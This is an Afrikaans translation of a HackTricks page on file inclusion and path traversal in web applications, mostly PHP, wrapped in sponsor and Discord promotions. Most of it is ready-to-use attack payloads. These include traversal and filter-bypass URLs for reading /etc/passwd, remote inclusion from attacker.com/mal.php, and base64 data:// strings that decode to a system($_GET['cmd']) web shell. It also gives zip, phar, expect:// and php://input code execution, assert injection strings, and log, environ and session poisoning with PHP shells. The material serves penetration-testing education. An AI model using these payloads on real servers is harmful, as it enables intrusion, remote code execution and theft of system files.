# Lêer Insluiting/Pad deursnuffeling

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!

**Hakwerk Insigte**\
Betrokkenheid by inhoud wat die opwinding en uitdagings van hakwerk ondersoek

**Reële-Tyd Haknuus**\
Bly op hoogte van die snelbewegende hakwêreld deur middel van reële-tyd nuus en insigte

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platformopdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## Lêer Insluiting

**Verre Lêer Insluiting (RFI):** Die lêer word gelaai vanaf 'n verre bediener (Beste: Jy kan die kode skryf en die bediener sal dit uitvoer). In php is dit **gestrem** standaard (**allow\_url\_include**).\
**Plaaslike Lêer Insluiting (LFI):** Die bediener laai 'n plaaslike lêer.

Die kwesbaarheid kom voor wanneer die gebruiker op een of ander manier die lêer kan beheer wat deur die bediener gelaai gaan word.

Kwesbare **PHP funksies**: require, require\_once, include, include\_once

'n Interessante instrument om hierdie kwesbaarheid uit te buit: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessant - LFI2RCE lêers
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie \*nix LFI-lys te meng en meer paaie by te voeg, het ek hierdie een geskep:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Probeer ook om `/` te verander na `\`\
Probeer ook om `../../../../../` by te voeg

'n lys wat verskeie tegnieke gebruik om die lêer /etc/password te vind (om te kyk of die kwesbaarheid bestaan) kan [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) gevind word

### **Windows**

Saamvoeging van verskillende woordlyste:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Probeer ook om `/` te verander na `\`\
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg

'n lys wat verskeie tegnieke gebruik om die lêer /boot.ini te vind (om te kyk of die kwesbaarheid bestaan) kan [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) gevind word

### **OS X**

Kyk na die LFI-lys van linux.

## Basiese LFI en omseilings

Al die voorbeelde is vir Plaaslike Lêer Insleep, maar kan ook op Afgeleë Lêer Insleep toegepas word (bladsy=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### deursnuffelingsvolgordes ontkleed nie-herhalend
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass die aanhegting van meer karakters aan die einde van die voorsiene string (bypass van: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Kodering**

Jy kan nie-standaard koderings soos dubbele URL-kodering (en ander) gebruik:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Van bestaande vouer

Miskien kontroleer die agterkant die vouerpad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verken van Lêersisteemgids op 'n Bediener

Die lêersisteem van 'n bediener kan rekursief verken word om gidsname, nie net lêers, te identifiseer deur sekere tegnieke toe te pas. Hierdie proses behels die bepaling van die gidsdiepte en die ondersoek na die bestaan van spesifieke gidsname. Hieronder is 'n gedetailleerde metode om dit te bereik:

1. **Bepaal Gidsdiepte:** Stel die diepte van jou huidige gids vas deur suksesvol die `/etc/passwd`-lêer op te haal (van toepassing as die bediener op Linux gebaseer is). 'n Voorbeeld-URL kan so gestruktureer wees, wat 'n diepte van drie aandui:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ondersoek vir Lêers:** Voeg die naam van die vermoede lêer by die URL (bv., `private`), en navigeer dan terug na `/etc/passwd`. Die ekstra gidsvlak vereis 'n verhoging van die diepte met een:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpreteer die Resultate:** Die reaksie van die bediener dui aan of die omslag bestaan:
   * **Fout / Geen Uitset:** Die omslag `private` bestaan waarskynlik nie op die gespesifiseerde plek nie.
   * **Inhoud van `/etc/passwd`:** Die teenwoordigheid van die `private` omslag word bevestig.
4. **Herhalende Verkenning:** Ontdekte omslae kan verder ondersoek word vir subdossiers of lêers deur dieselfde tegniek of tradisionele Plaaslike Lêer Insluiting (LFI) metodes te gebruik.

Vir die verkenning van gids by verskillende plekke in die lêersisteem, pas die las aan soos nodig. Byvoorbeeld, om te kyk of `/var/www/` 'n `private` omslag bevat (onder die aanname dat die huidige omslag op 'n diepte van 3 is), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Padafkappingsmetode**

Padafkapping is 'n metode wat gebruik word om lêerpaadjies in webtoepassings te manipuleer. Dit word dikwels gebruik om toegang tot beperkte lêers te verkry deur sekere sekuriteitsmaatreëls te omseil wat ekstra karakters aan die einde van lêerpaadjies voeg. Die doel is om 'n lêerpaadjie te skep wat, nadat dit deur die sekuriteitsmaatreël verander is, steeds na die gewenste lêer verwys.

In PHP kan verskeie voorstellings van 'n lêerpaadjie as ekwivalent beskou word as gevolg van die aard van die lêersisteem. Byvoorbeeld:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, en `/etc/passwd/` word almal as dieselfde paadjie hanteer.
* Wanneer die laaste 6 karakters `passwd` is, verander die toevoeging van 'n `/` (waar dit `passwd/` maak) nie die geteikende lêer nie.
* Op dieselfde manier, as `.php` by 'n lêerpaadjie gevoeg word (soos `shellcode.php`), sal die byvoeging van `/.` aan die einde nie die toeganklike lêer verander nie.

Die voorsiene voorbeelde demonstreer hoe om padafkapping te gebruik om toegang tot `/etc/passwd` te verkry, 'n algemene teiken as gevolg van sy sensitiewe inhoud (gebruikersrekeninginligting):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's mag die aantal traversals wat benodig word, ongeveer 2027 wees, maar hierdie aantal kan varieer gebaseer op die bediener se konfigurasie.

* **Gebruik van Puntsegmente en Addisionele Karakters**: Traversal-reeks (`../`) gekombineer met ekstra puntsegmente en karakters kan gebruik word om die lêersisteem te navigeer, waardeur die aangehegte strings deur die bediener geïgnoreer word.
* **Bepaling van die Benodigde Aantal Traversals**: Deur toets en fout, kan die presiese aantal `../` reekse wat nodig is om na die hoofgids te navigeer en dan na `/etc/passwd` gevind word, wat verseker dat enige aangehegte strings (soos `.php`) geneutraliseer word, maar die gewenste pad (`/etc/passwd`) bly intak.
* **Begin met 'n Vals Gids**: Dit is 'n algemene praktyk om die pad te begin met 'n nie-bestaande gids (soos `a/`). Hierdie tegniek word gebruik as 'n voorbehoedende maatreël of om aan die vereistes van die bediener se padontledingslogika te voldoen.

Wanneer padafkappings tegnieke gebruik word, is dit noodsaaklik om die bediener se padontledingsgedrag en lêersisteemstruktuur te verstaan. Elke scenario mag 'n ander benadering vereis, en toetsing is dikwels nodig om die mees doeltreffende metode te vind.

**Hierdie kwesbaarheid is reggestel in PHP 5.3.**

### **Filter omseilingswenke**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Verre lêer insluiting

In php is dit standaard afgeskakel omdat **`allow_url_include`** **Af** is. Dit moet **Aan** wees vir dit om te werk, en in daardie geval kan jy 'n PHP-lêer vanaf jou bediener insluit en RCE kry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Indien om een of ander rede **`allow_url_include`** **Aan** is, maar PHP toegang tot eksterne webbladsye **filter**, [volgens hierdie pos](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data-protokol met base64 gebruik om 'n b64 PHP-kode te dekodeer en RCE te kry:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
In die vorige kode is die finale `+.txt` bygevoeg omdat die aanvaller 'n string benodig het wat eindig op `.txt`, sodat die string daarmee eindig en na die b64-dekodeer daardie deel net rommel sal teruggee en die werklike PHP-kode ingesluit (en dus uitgevoer) sal word.
{% endhint %}

'n Ander voorbeeld **sonder die gebruik van die `php://` protokol** sou wees:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Wortelelement

In Python in 'n kode soos hierdie een:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Indien die gebruiker 'n **absoluut pad** na **`file_name`** deurgee, word die **vorige pad net verwyder**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die bedoelde gedrag volgens [die dokumentasie](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> As 'n komponent 'n absolute pad is, word alle vorige komponente weggegooi en die aansluiting gaan voort vanaf die absolute pad komponent.

## Java Lys Gidse

Dit lyk asof as jy 'n Pad Traversal in Java het en jy **vir 'n gids vra** in plaas van 'n lêer, word 'n **lys van die gids teruggegee**. Dit sal nie in ander tale gebeur nie (sover ek weet).

## Top 25 parameters

Hier is 'n lys van die top 25 parameters wat vatbaar kan wees vir plaaslike lêer insluiting (LFI) kwesbaarhede (vanaf [skakel](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI gebruik van PHP wrappers & protokolle

### php://filter

PHP-filters maak basiese **wysigingsoperasies op die data** moontlik voordat dit gelees of geskryf word. Daar is 5 kategorieë van filters:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Verwyder tages van die data (alles tussen "<" en ">" karakters)
* Let daarop dat hierdie filter uit die moderne weergawes van PHP verdwyn het
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Verander na 'n ander enkodering (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle ondersteunde enkoderings** te kry, hardloop in die konsole: `iconv -l`

{% hint style="warning" %}
Deur die `convert.iconv.*` omskakelingsfilter te misbruik, kan jy **willekeurige teks genereer**, wat nuttig kan wees om willekeurige teks te skryf of 'n funksie soos insluitingsproses willekeurige teks te maak. Vir meer inligting kyk na [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Komprimeer die inhoud (nuttig as jy baie inligting uitlek)
* `zlib.inflate`: Dekomprimeer die data
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Verouderd
* `mdecrypt.*` : Verouderd
* Ander Filters
* Deur in php te hardloop `var_dump(stream_get_filters());` kan jy 'n paar **onverwagte filters** vind:
* `consumed`
* `dechunk`: keer HTTP stuksgewyse enkodering om
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Die deel "php://filter" is nie hoofletter sensitief nie
{% endhint %}

### Gebruik van php-filters as orakel om willekeurige lêers te lees

[**In hierdie pos**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) word 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder om die uitset wat van die bediener teruggegee word te hê. Hierdie tegniek is gebaseer op 'n **boolean uitlekking van die lêer (karakter vir karakter) deur php-filters** as orakel te gebruik. Dit is omdat php-filters gebruik kan word om 'n teks groot genoeg te maak om 'n uitsondering in php te veroorsaak.

In die oorspronklike pos kan jy 'n gedetailleerde verduideliking van die tegniek vind, maar hier is 'n vinnige opsomming:

* Gebruik die kodeerder **`UCS-4LE`** om die leidende karakter van die teks aan die begin te laat en die grootte van die string eksponensieel te verhoog.
* Dit sal gebruik word om 'n **teks so groot te genereer wanneer die aanvanklike letter korrek gegok word** dat php 'n **fout sal veroorsaak**
* Die **dechunk**-filter sal **alles verwyder as die eerste karakter nie 'n heksadesimale karakter is nie**, sodat ons kan weet of die eerste karakter heksadesimaal is.
* Dit, gekombineer met die vorige (en ander filters afhangende van die gegokte letter), sal ons in staat stel om 'n letter aan die begin van die teks te raai deur te sien wanneer ons genoeg transformasies doen om dit nie 'n heksadesimale karakter te maak nie. Want as dit heksadesimaal is, sal dechunk dit nie verwyder nie en die aanvanklike bom sal php-fout veroorsaak.
* Die kodeerder **convert.iconv.UNICODE.CP930** verander elke letter in die volgende een (dus na hierdie kodeerder: a -> b). Dit stel ons in staat om te ontdek of die eerste letter 'n `a` is byvoorbeeld omdat as ons 6 van hierdie kodeerders toepas a->b->c->d->e->f->g is die letter nie meer 'n heksadesimale karakter nie, daarom verwyder dechunk dit nie en word die php-fout veroorsaak omdat dit met die aanvanklike bom vermenigvuldig.
* Deur ander transformasies soos **rot13** aan die begin te gebruik, is dit moontlik om ander karakters soos n, o, p, q, r te lek (en ander kodeerders kan gebruik word om ander letters na die heks-bereik te skuif).
* Wanneer die aanvanklike karakter 'n nommer is, moet dit base64-kodeer word en die eerste 2 letters gelek word om die nommer te lek.
* Die finale probleem is om te sien **hoe om meer as die aanvanklike letter te lek**. Deur orde-geheue-filters soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** te gebruik, is dit moontlik om die orde van die karakters te verander en ander letters van die teks in die eerste posisie te kry.
* En om in staat te wees om **verdere data** te verkry, is die idee om **2 byte rommeldata aan die begin te genereer** met **convert.iconv.UTF16.UTF16**, pas **UCS-4LE** toe om dit met die volgende 2 byte te **pivot**, en **verwyder die data tot by die rommeldata** (dit sal die eerste 2 bytes van die aanvanklike teks verwyder). Gaan voort om dit te doen totdat jy die gewenste bit bereik om te lek.

In die pos is 'n instrument om dit outomaties uit te voer ook gelek: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Hierdie omhulsel maak dit moontlik om toegang tot lêerbeskrywers te verkry wat die proses oop het. Potensieel nuttig om die inhoud van oop lêers uit te lek:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Jy kan ook **php://stdin, php://stdout en php://stderr** gebruik om die **lêer beskrywers 0, 1 en 2** onderskeidelik te benader (nie seker hoe dit nuttig kan wees in 'n aanval nie)

### zip:// en rar://

Laai 'n Zip of Rar lêer met 'n PHPShell binne en benader dit.\
Om die rar-protokol te misbruik, **moet dit spesifiek geaktiveer word**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Hierdie tegniek maak gebruik van die `data://` URI-skema om data direk in 'n webbladsy in te sluit. Dit kan gebruik word om sensetiewe inligting bloot te stel of om kwaadwillige kode uit te voer op die webbediener.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Merk op dat hierdie protokol beperk word deur php-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Verwagting moet geaktiveer word. Jy kan kode uitvoer met behulp hiervan:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### inset://

Spesifiseer jou lading in die POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` gebruik vir lêerlaai. Die PHP-kodefragment hieronder toon die skep van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar` lêer saam te stel, moet die volgende bevel uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
Bij uitvoering sal 'n lêer genaamd `test.phar` geskep word, wat moontlik benut kan word om plaaslike lêer insluitings (LFI) kwesbaarhede te misbruik.

In gevalle waar die LFI slegs lêerlesing uitvoer sonder om die PHP-kode binne-in uit te voer, deur funksies soos `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, of `filesize()`, kan 'n poging aangewend word om 'n deserialisasie kwesbaarheid te misbruik. Hierdie kwesbaarheid word geassosieer met die lees van lêers deur die gebruik van die `phar` protokol.

Vir 'n gedetailleerde begrip van die misbruik van deserialisasie kwesbaarhede in die konteks van `.phar` lêers, verwys na die dokument wat hieronder gekoppel is:

[Phar Deserialisasie Misbruiksgids](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

Dit was moontlik om enige arbitrêre lêer wat van PHP ondersteun word om php filters te lees, te misbruik om 'n RCE te kry. Die gedetailleerde beskrywing kan [**gevind word in hierdie pos**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Baie vinnige opsomming: 'n **3 byte oorvloei** in die PHP-heap is misbruik om die ketting van vry stukke van 'n spesifieke grootte te verander om in staat te wees om **enigiets op enige adres te skryf**, dus 'n haak is bygevoeg om **`system`** te roep.\
Dit was moontlik om stukke van spesifieke groottes toe te ken deur meer php filters te misbruik.

### Meer protokolle

Kyk na meer moontlike [**protokolle om hier in te sluit**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory en php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (nie seker hoe dit nuttig kan wees in 'n lêer insluitingsaanval nie)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Toegang tot plaaslike lêerstelsel
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Toegang tot HTTP(s) URL's
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Toegang tot FTP(s) URL's
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompresie Strome
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Vind padname wat ooreenstem met patroon (Dit gee niks drukbare terug nie, dus nie regtig nuttig hier nie)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Veilige Skel 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Klankstrome (Nie nuttig om arbitrêre lêers te lees nie)

## LFI via PHP se 'assert'

Plaaslike Lêer Insluiting (LFI) risiko's in PHP is opvallend hoog wanneer daar gewerk word met die 'assert' funksie, wat kode binne-in strings kan uitvoer. Dit is veral problematies as insette wat die karakters vir deursnuffeling van gids soos ".." bevat, nagegaan word maar nie behoorlik gesaniteer word nie.

Byvoorbeeld, PHP-kode kan ontwerp wees om deursnuffeling van gids soos volg te voorkom:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Terwyl dit daarop gemik is om traversering te stop, skep dit onbedoeld 'n vektor vir kode-inspuiting. Om hiervan gebruik te maak vir die lees van lêerinhoud, kan 'n aanvaller die volgende gebruik:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Op dieselfde manier, vir die uitvoering van willekeurige stelselopdragte, kan 'n persoon die volgende gebruik:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om **hierdie ladinge te URL-kodeer**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!

**Hack-insigte**\
Gaan in gesprek met inhoud wat die opwinding en uitdagings van hack bekyk

**Nuutste Hack-nuus**\
Bly op hoogte van die snelveranderende hackwêreld deur middel van nuus en insigte in werklikheid

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platformopdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## PHP Blinde Padtraversering

{% hint style="warning" %}
Hierdie tegniek is relevant in gevalle waar jy die lêerpad van 'n PHP-funksie **beheer** wat 'n lêer sal **toegang** maar jy sal nie die inhoud van die lêer sien nie (soos 'n eenvoudige oproep na **`file()`**) maar die inhoud word nie vertoon nie.
{% endhint %}

In [**hierdie ongelooflike pos**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) word verduidelik hoe 'n blinde padtraversering misbruik kan word via PHP-filter om die inhoud van 'n lêer te **eksfiltreer via 'n fout-orakel**.

Kortliks, die tegniek gebruik die **"UCS-4LE" kodering** om die inhoud van 'n lêer so **groot** te maak dat die **PHP-funksie wat die lêer oopmaak** 'n **fout** sal veroorsaak.

Dan, om die eerste karakter te lek, word die filter **`dechunk`** gebruik saam met ander soos **base64** of **rot13** en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om **ander karakters aan die begin te plaas en hulle te lek**.

**Funksies wat vatbaar kan wees**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (slegs teiken lees net met hierdie)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede, kyk na die genoemde pos!

## LFI2RCE

### Verre Lêerinsluiting

Voorheen verduidelik, [**volg hierdie skakel**](./#remote-file-inclusion).

### Via Apache/Nginx log lêer

As die Apache- of Nginx-bediener **vatbaar is vir LFI** binne die insluitfunksie, kan jy probeer om toegang te verkry tot **`/var/log/apache2/access.log` of `/var/log/nginx/access.log`**, stel binne die **gebruiker-agent** of binne 'n **GET-parameter** 'n php-skul in soos **`<?php system($_GET['c']); ?>`** en sluit daardie lêer in

{% hint style="warning" %}
Let daarop dat **as jy dubbele aanhalingstekens** vir die skul gebruik in plaas van **enkele aanhalingstekens**, sal die dubbele aanhalingstekens gewysig word vir die string "_**quote;**_", **PHP sal 'n fout gooi** daar en **niks anders sal uitgevoer word** nie.

Maak ook seker jy **skryf die lading korrek** of PHP sal elke keer 'n fout gooi wanneer dit probeer om die log lêer te laai en jy sal nie 'n tweede geleentheid hê nie.
{% endhint %}

Dit kan ook in ander logboeke gedoen word, maar **wees versigtig,** die kode binne die logboeke kan URL-gekodeer wees en dit kan die Skul vernietig. Die kop **authorisation "basic"** bevat "gebruiker:wagwoord" in Base64 en dit word binne die logboeke ontsluit. Die PHPShell kan binne hierdie kop ingevoeg word.\
Ander moontlike log-paaie:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing woordelys: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via E-pos

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP lading bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer om dit in te sluit in die e-pos van die gebruiker met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Laai baie doppe op (byvoorbeeld: 100)
2. Sluit [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) in, met $PID = PID van die proses (kan afgedwing word) en $FD die lêerbeskrywer (kan ook afgedwing word)

### Via /proc/self/environ

Soos 'n log lêer, stuur die lading in die Gebruiker-Agent, dit sal weerspieël word binne die /proc/self/environ lêer
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Deur oplaai

As jy 'n lêer kan oplaai, insluit die dop payload daarin (bv. : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
### Deur middel van Zip-lêer oplaai

Laai 'n ZIP-lêer op wat 'n PHP dop bevat wat saamgedruk is en toegang:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP-sessies

Kontroleer of die webwerf PHP-sessies gebruik (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessies gestoor in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die koekie in op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
